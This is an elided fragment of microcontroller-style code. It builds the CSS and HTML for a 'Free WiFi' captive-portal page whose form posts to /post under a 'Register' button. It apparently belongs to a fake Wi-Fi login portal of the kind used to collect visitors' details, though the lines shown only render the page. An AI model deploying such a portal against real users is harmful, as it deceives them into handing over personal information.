...
String header(String t) {
  ...
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               ...
               // Data input box
               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #f5873d; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               //  Free WiFi Navbar
               "nav { background: #f5873d; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         ...
         //SUBMIT
         "<center><input type=submit  style=background:#f5873d;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();
